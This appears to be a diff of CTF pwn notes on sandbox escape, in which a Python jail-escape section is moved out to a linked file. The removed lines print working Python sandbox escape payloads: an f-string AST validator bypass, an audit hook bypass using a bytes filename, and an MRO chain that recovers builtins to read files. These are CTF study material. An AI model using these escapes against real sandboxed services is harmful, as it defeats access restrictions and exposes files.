@@ -1,7 +1,7 @@
 # CTF Pwn - Sandbox Escape and Restricted Environments
 
 ## Table of Contents
-- [Python Sandbox Escape (eval/exec Challenges)](#python-sandbox-escape-evalexec-challenges)
+- [Python Sandbox Escape](#python-sandbox-escape)
 - [VM Exploitation (Custom Bytecode)](#vm-exploitation-custom-bytecode)
 - [FUSE/CUSE Character Device Exploitation](#fusecuse-character-device-exploitation)
 - [Busybox/Restricted Shell Escalation](#busyboxrestricted-shell-escalation)
@@ -9,27 +9,9 @@
 
 ---
 
-## Python Sandbox Escape (eval/exec Challenges)
+## Python Sandbox Escape
 
-**AST bypass via f-strings:** Validators that `pass` on `JoinedStr` (f-string AST nodes) don't recurse into children, allowing arbitrary expressions inside `f"{...}"`:
-```python
-# Bypasses AST validation that blocks Call nodes
-payload = 'f"{().__class__.__mro__[1].__subclasses__()}"'
-```
-
-**Audit hook bypass:** `isinstance(args[0], str)` check bypassed by passing `b'flag.txt'` (bytes) instead of `str`:
-```python
-# Audit hook checks: isinstance(filename, str) -> True blocks it
-# Bypass: open(b'flag.txt') -> isinstance(b'flag.txt', str) -> False
-```
-
-**Builtin recovery chain:**
-```python
-# Walk MRO to recover __builtins__
-B = [c for c in ().__class__.__mro__[1].__subclasses__()
-     if c.__init__.__class__.__name__ == 'function'][0].__init__.__globals__['__builtins__']
-B['open'](b'flag.txt').read()
-```
+Python jail/sandbox escape techniques (AST bypass, audit hook bypass, MRO-based builtin recovery, decorator chains, restricted charset tricks, and more) are covered comprehensively in [ctf-misc/pyjails.md](../ctf-misc/pyjails.md).
 
 ## VM Exploitation (Custom Bytecode)
 
